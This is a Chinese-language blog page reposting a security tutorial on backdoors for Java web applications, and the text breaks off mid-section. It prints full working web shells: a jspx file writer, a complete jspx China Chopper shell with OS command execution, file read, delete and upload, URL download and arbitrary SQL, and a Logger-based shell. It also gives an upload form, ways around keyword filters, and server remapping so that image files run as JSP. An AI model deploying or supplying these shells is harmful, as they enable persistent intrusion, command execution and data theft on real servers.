<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>攻击JavaWeb应用 8]-后门篇 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2013-10-21T21:09:36.000Z" itemprop="datePublished">
          2013-10-22
      </time>
    
    
    | 
    <a href='/tag/菜刀/'>菜刀</a>,
    
    <a href='/tag/后门/'>后门</a>
    
    
</span>
    <h1 class="post-title">攻击JavaWeb应用 8]-后门篇</h1>
    <section class="post-content">
      <h4><a href="http://drops.wooyun.org/tips/662" target="_blank" rel="external">攻击JavaWeb应用[8]-后门篇</a></h4>  <h4>0x00 背景</h4>  <hr align="left" width="100%" noshade="noshade" size="2">  <p>关于JavaWeb <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a> 问题一直以来都比较少，而比较新奇的后门更少。在这里我分享几种比较有意思的JavaWeb后门给大家玩。</p>  <h4>0x01 jspx <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a>&#160;</h4>  <hr align="left" width="100%" noshade="noshade" size="2">  <p>在如今的web应用当中如果想直接传个jsp已经变得比较难了，但是如果只限制了asp、php、jsp、aspx等这些常见的后缀应该怎样去突破呢？我在读tomcat的配置文件的时候看到jsp和jspx都是由org.apache.jasper.servlet.JspServlet处理，于是想构建一个jspx的webshell。经过反复的折腾，一个jspx的后门就粗线了。测试应该是java的所有的server都默认支持。</p>  <h5>Tomcat默认的conf/web.xml下的配置：</h5>  <pre><code>&#160;&#160; &lt;servlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;fork&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;param-value&gt;false&lt;/param-value&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;/init-param&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet&gt;</code></pre><br><br><pre><code>&#160;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;servlet-mapping&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;<em>.jsp&lt;/url-pattern&gt;</em></code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;url-pattern&gt;.jspx&lt;/url-pattern&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/servlet-mapping&gt;</code></pre><br><br><p>关于jspx的资料网上并不多，官网给的文档也不清楚，搞的模模糊糊的。怎么去玩jspx大家可以看下官网的demo，或者参考一些文章。</p><br><br><p><a href="http://jspx-bay.sourceforge.net/" target="_blank" rel="external">http://jspx-bay.sourceforge.net</a></p><br><br><p>关于jspx文件的一些说明：</p><br><br><p><a href="http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_4b6de6bb0100089s.html</a></p><br><br><p>重点在于把Jsp里面的一些标记转换成xml支持的格式，比如：</p><br><br><pre><code>&lt;%@ include .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.include .. /&gt;</code></pre><br><br><pre><code> &lt;%@ page .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:directive.page .. /&gt;</code></pre><br><br><pre><code>&lt;%@ taglib .. %&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; xmlns:prefix=&quot;tag library URL&quot;</code></pre><br><br><pre><code>&lt;%= ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:expression&gt; .. &lt;/jsp:expression&gt;</code></pre><br><br><pre><code>&lt;% ..%&gt;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &lt;jsp:scriptlet&gt; .. &lt;/jsp:scriptlet&gt;</code></pre><br><br><p>知道&lt;% %&gt;可以用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>标记表示那么做起来就很简单了，直接把标记换下是非常容易做的。所以写个简单的shell一个就很简单了，但是如果想知道具体有那些标签或者说跟jsp里面的有那些不同怎么办呢？下面我简单的做了下对比（前面是jsp的代码提示，后面是jspx）：</p><br><br><p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image001.jpg" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="353" alt="clip_image001" src="http://img.cker.in/JavaWeb8_9E52/clip_image001_thumb.jpg" width="392" border="0"></a></p><br><br><p>照着提示翻译下得知表示jsp里面的&lt;%! %&gt;需要用：<code>&lt;jsp:declaration&gt;&lt;/jsp:declaration&gt;</code>标签去替换就行了。</p><br><br><h5>其他重要提醒：</h5><br><br><p>在jspx里面遵循xml语法所以直接在jsp:declaration或者jsp:scriptlet标签内写&quot;&lt;&gt;&quot;这样的符号是不行的，需要转意（不转意会报编译错误，猜了下只需要把&lt;&gt;转成<code>&amp;lt;&#160;&#160; &amp;gt;</code>就行了）。</p><br><br><h5>jspx后门的具体实现代码：</h5><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:root xmlns:jsp=&quot;<a href="http://java.sun.com/JSP/Page&amp;quot" target="_blank" rel="external">http://java.sun.com/JSP/Page&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns=&quot;<a href="http://www.w3.org/1999/xhtml&amp;quot" target="_blank" rel="external">http://www.w3.org/1999/xhtml&amp;quot</a>;</code></pre><br><br><pre><code>&#160;&#160;&#160; xmlns:c=&quot;<a href="http://java.sun.com/jsp/jstl/core&amp;quot" target="_blank" rel="external">http://java.sun.com/jsp/jstl/core&amp;quot</a>; version=&quot;1.2&quot;&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:directive.page import=&quot;java.io.<em>&quot; /&gt;</em></code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;jsp:scriptlet&gt;</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; RandomAccessFile rf = new RandomAccessFile(request.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;), &quot;rw&quot;);</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.write(request.getParameter(&quot;t&quot;).getBytes());</code></pre><br><br><pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.close();</code></pre><br><br><pre><code>&#160;&#160;&#160; &lt;/jsp:scriptlet&gt;</code></pre><br><br><pre><code>&lt;/jsp:root&gt;</code></pre><br><a id="more"></a><br><pre><code></code></pre><br><br><h5>jspx实现的我之前发的<a href="http://Ha.Cker.In/tag/菜刀" target="_blank">菜刀</a>最终版：</h5><br><br><p><a href="http://localhost:8080/jspx.jspx" target="_blank" rel="external">http://localhost:8080/jspx.jspx</a> ￼ 直接用菜刀连接：</p><br><br><p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image002.jpg" target="_blank" rel="external"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="509" alt="clip_image002" src="http://img.cker.in/JavaWeb8_9E52/clip_image002_thumb.jpg" width="806" border="0"></a></p><br><br><pre><code>&lt;jsp:root xmlns:jsp=&quot;<a href="http://java.sun.com/JSP/Page&amp;quot" target="_blank" rel="external">http://java.sun.com/JSP/Page&amp;quot</a>; xmlns=&quot;<a href="http://www.w3.org/1999/xhtml&amp;quot" target="_blank" rel="external">http://www.w3.org/1999/xhtml&amp;quot</a>; xmlns:c=&quot;<a href="http://java.sun.com/jsp/jstl/core&amp;quot" target="_blank" rel="external">http://java.sun.com/jsp/jstl/core&amp;quot</a>; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;&lt;jsp:directive.page import=&quot;java.io.&quot;/&gt;&lt;jsp:directive.page import=&quot;java.util.<em>&quot;/&gt;&lt;jsp:directive.page import=&quot;java.net.</em>&quot;/&gt;&lt;jsp:directive.page import=&quot;java.sql.<em>&quot;/&gt;&lt;jsp:directive.page import=&quot;java.text.</em>&quot;/&gt;&lt;jsp:declaration&gt;String Pwd=&quot;023&quot;;String cs=&quot;UTF-8&quot;;String EC(String s)throws Exception{return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim());if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1){return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);if(x.length&gt;4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&amp;lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0; i&amp;lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ +=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory()){sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);}else{sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &amp;lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&quot;|&quot;+&quot;&amp;lt;-&quot;).getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h=&quot;0123456789ABCDEF&quot;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&amp;lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&amp;lt;z.length; j++){HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+&quot;\t&quot;);}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split(&quot;\r\n&quot;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null,&quot;%&quot;,new String[]{&quot;TABLE&quot;});while(r.next()){sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&amp;lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(&quot;–f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;–f:&quot;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &amp;lt;=n; i++){sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);}sb.append(&quot;\r\n&quot;);if(q.indexOf(&quot;–f:&quot;)!=-1){File file=new File(p);if(q.indexOf(&quot;-to:&quot;)==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;–f:&quot;)+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&amp;lt;=n;i++){if(q.indexOf(&quot;–f:&quot;)!=-1){bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);bw.flush();}else{sb.append(r.getObject(i)+&quot;&quot;+&quot;\t|\t&quot;);}}if(bw!=null){bw.newLine();}sb.append(&quot;\r\n&quot;);}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(&quot;Result\t|\t\r\n&quot;);try{m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);}catch(Exception ee){sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);}}m.close();c.close();}&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;cs=request.getParameter(&quot;z0&quot;)!=null?request.getParameter(&quot;z0&quot;)+&quot;&quot;:cs;response.setContentType(&quot;text/html&quot;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try{String Z=EC(request.getParameter(Pwd)+&quot;&quot;);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;);sb.append(&quot;-&gt;&quot;+&quot;|&quot;);String s=request.getSession().getServletContext().getRealPath(&quot;/&quot;);if(Z.equals(&quot;A&quot;)){sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;)){AA(sb);}}else if(Z.equals(&quot;B&quot;)){BB(z1,sb);}else if(Z.equals(&quot;C&quot;)){String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}br.close();}else if(Z.equals(&quot;D&quot;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);}else if(Z.equals(&quot;E&quot;)){EE(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;F&quot;)){FF(z1,response);}else if(Z.equals(&quot;G&quot;)){GG(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;H&quot;)){HH(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;I&quot;)){II(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;J&quot;)){JJ(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;K&quot;)){KK(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;L&quot;)){LL(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;M&quot;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&quot;N&quot;)){NN(z1,sb);}else if(Z.equals(&quot;O&quot;)){OO(z1,sb);}else if(Z.equals(&quot;P&quot;)){PP(z1,sb);}else if(Z.equals(&quot;Q&quot;)){QQ(cs,z1,z2,sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\&quot;,&quot;/&quot;)+&quot;images/&quot;);}}catch(Exception e){sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());}sb.append(&quot;|&quot;+&quot;&amp;lt;-&quot;);out.print(sb.toString());&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</code></pre><br><br><h4>0x02 Java Logger日志后门</h4>

<hr align="left" width="100%" noshade="noshade" size="2">

<p>某些场景下shell可能被过滤掉了，但是利用一些有趣的东东可以绕过，比如不用new File这样的方式去写文件，甚至是尽可能的不要出现File关键字。</p>

<p>看了下java.util.logging.Logger挺有意思的，可以写日志文件，于是试了下用这样的方式去写一个shell，结果成功了。</p>

<p>java.util.logging.Logger默认输出的格式是xml，但这都不是事，直接格式化下日志以text方式输出就行了。</p>

<p>新建2.jsp并访问：</p>

<pre><code>&lt;%java.util.logging.Logger l=java.util.logging.Logger.getLogger(&quot;t&quot;);java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter(&quot;t&quot;));%&gt;</code></pre>

<p><a href="http://img.cker.in/JavaWeb8_9E52/clip_image003.jpg" target="_blank" rel="external"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="406" alt="clip_image003" src="http://img.cker.in/JavaWeb8_9E52/clip_image003_thumb.jpg" width="832" border="0"></a></p>

<h5>其他略特殊点的文件读写Demo：</h5>

<pre><code>new FileOutputStream </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; new FileOutputStream(&quot;d:/sb.txt&quot;).write(new String(&quot;123&quot;).getBytes()); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; new DataOutputStream </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; new DataOutputStream(new FileOutputStream(&quot;d:/1x.txt&quot;)).write(new String(&quot;123&quot;).getBytes()); </code></pre>

<pre><code>FileWriter fw = new FileWriter(&quot;d:/3.txt&quot;); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fw.write(&quot;21&quot;); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fw.flush(); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; fw.close(); </code></pre>

<pre><code>RandomAccessFile rf = new RandomAccessFile(&quot;d:/14.txt&quot;, &quot;rw&quot;); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.write(new String(&quot;3b&quot;).getBytes()); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; rf.close();</code></pre>

<h5>GetShell.htm: </h5>

<pre><code>&lt;html&gt; </code></pre>

<pre><code>&lt;head&gt; </code></pre>

<pre><code>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; </code></pre>

<pre><code>&lt;title&gt;jsp-yzmm&lt;/title&gt; </code></pre>

<pre><code>&lt;/head&gt; </code></pre>

<pre><code>&lt;style&gt; </code></pre>

<pre><code>.main{width:980px;height:600px;margin:0 auto;} </code></pre>

<pre><code>.url{width:300px;} </code></pre>

<pre><code>.fn{width:80px;} </code></pre>

<pre><code>.content{width:80%;height:60%;} </code></pre>

<pre><code>&lt;/style&gt; </code></pre>

<pre><code>&lt;script&gt; </code></pre>

<pre><code>&#160; function upload(){ </code></pre>

<pre><code>&#160;&#160;&#160; var url = document.getElementById('url').value, </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; content = document.getElementById('content').value, </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; fileName = document.getElementById('fn').value, </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; form = document.getElementById('fm'); </code></pre>

<pre><code>&#160;&#160;&#160; if(url.length == 0){ </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; alert(&quot;Url not allowd empty!&quot;); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; return ; </code></pre>

<pre><code>&#160;&#160;&#160; } </code></pre>

<pre><code>&#160;&#160;&#160; if(content.length == 0){ </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; alert(&quot;Content not allowd empty!&quot;); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; return ; </code></pre>

<pre><code>&#160;&#160;&#160; } </code></pre>

<pre><code>&#160;&#160;&#160; if(fileName.length == 0){ </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; alert(&quot;FileName not allowd empty!&quot;); </code></pre>

<pre><code>&#160;&#160;&#160;&#160;&#160; return ; </code></pre>

<pre><code>&#160;&#160;&#160; } </code></pre>

<pre><code>&#160;&#160;&#160; form.action = url; </code></pre>

<pre><code>&#160;&#160;&#160; form.submit(); </code></pre>

<pre><code>&#160; } </code></pre>

<pre><code>&lt;/script&gt; </code></pre>

<pre><code>&lt;body&gt; </code></pre>

<pre><code>&lt;div class=&quot;main&quot;&gt; </code></pre>

<pre><code>&#160; &lt;form id=&quot;fm&quot; method=&quot;post&quot;&gt;&#160;&#160; </code></pre>

<pre><code>&#160;&#160;&#160; URL:&lt;input type=&quot;text&quot; value=&quot;http://localhost/Struts2/css3.jsp&quot; class=&quot;url&quot; id=&quot;url&quot; /&gt;&amp;nbsp;&amp;nbsp; </code></pre>

<pre><code>&#160;&#160;&#160; FileName:&lt;input type=&quot;text&quot; name=&quot;f&quot; value=&quot;css.jsp&quot; class=&quot;fn&quot; id=&quot;fn&quot; /&gt;&amp;nbsp;&amp;nbsp; </code></pre>

<pre><code>&#160;&#160;&#160; &lt;a href=&quot;javascript:upload();&quot;&gt;Upload&lt;/a&gt;&lt;br/&gt; </code></pre>

<pre><code>&#160;&#160;&#160; &lt;textarea id=&quot;content&quot; class=&quot;content&quot; name=&quot;t&quot; &gt;&lt;/textarea&gt; </code></pre>

<pre><code>&#160; &lt;/form&gt; </code></pre>

<pre><code>&lt;/div&gt; </code></pre>

<pre><code>&lt;/body&gt; </code></pre>

<pre><code>&lt;/html&gt;</code></pre>

<p><a href="http://xsser.me/caidao/getshell-by-logger.jsp" target="_blank" rel="external">http://xsser.me/caidao/getshell-by-logger.jsp</a></p>

<p><a href="http://xsser.me/caidao/getshell-by-logger.txt" target="_blank" rel="external">http://xsser.me/caidao/getshell-by-logger.txt</a></p>

<h4>0x03 jspf <a href="http://Ha.Cker.In/tag/后门" target="_blank">后门</a></h4>

<hr align="left" width="100%" noshade="noshade" size="2">

<p>在 <a href="http://Ha.Cker.In/tag/Resin" target="_blank">Resin</a> 的配置文件conf/app-default.xml看到了几个可以用jsp方式去解析的后缀，其中就包含了jspf和上面的jspx： ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image004.png" target="_blank" rel="external"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="602" alt="clip_image004" src="http://img.cker.in/JavaWeb8_9E52/clip_image004_thumb.png" width="690" border="0"></a></p>

<p>其中的resin-jsp和resin-jspx差不多，都是com.caucho.jsp.JspServlet处理，知识后者在init标签中标明了是以xml方式解析：<code>&lt;xml&gt;true&lt;/xml&gt;</code>。</p>

<p>百度了下此jspf非框架（Java Simple Plugin Framework），JSP最新的规范已经纳入了jspf为JSP内容的文件。但是经过测试主流的JavaServer仅有resin和jetty支持，tomcat等server并不支持。不过在实际的生产环境上resin用的非常广泛。至于jetty略少，不过貌似bae是用的jetty。</p>

<p>直接把css.jsp文件改名为1.jspf请求即可看到成功调用菜刀接口： ￼ <a href="http://img.cker.in/JavaWeb8_9E52/clip_image005.png" target="_blank" rel="external"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="290" alt="clip_image005" src="http://img.cker.in/JavaWeb8_9E52/clip_image005_thumb.png" width="658" border="0"></a></p>

<h4>0x04 邪恶后门第一式-恶意的任意后缀解析</h4>

<hr align="left" width="100%" noshade="noshade" size="2">

<p>从 <a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a> 和 <a href="http://Ha.Cker.In/tag/Resin" target="_blank">Resin</a> 的配置当中可以看出来，其实脚本可以是任意后缀，只要在配置解析的地方修改下映射的后缀就行了。那么只要修改下配置文件中后缀映射为jsp对于的解析的servlet名字就可以轻松的留下一个“不同寻常”的后缀的后门了。我测试Tomcat6/8和Resin3发现：一个运行当中的server当修改他们的映射的文件后不需要重启即可自动生效。也就是说可能一个网站存在跨目录的文件编辑漏洞，只要找到对于的配置文件地址修改后就能访问1.jpg去执行恶意的jsp脚本，这听起来有点让人不寒而栗。Getshell后只要把这配置文件一改丢个jpg就能做后门了。</p>

<h5><a href="http://Ha.Cker.In/tag/Tomcat" target="_blank">Tomcat</a> 修改conf/web.xml：</h5>

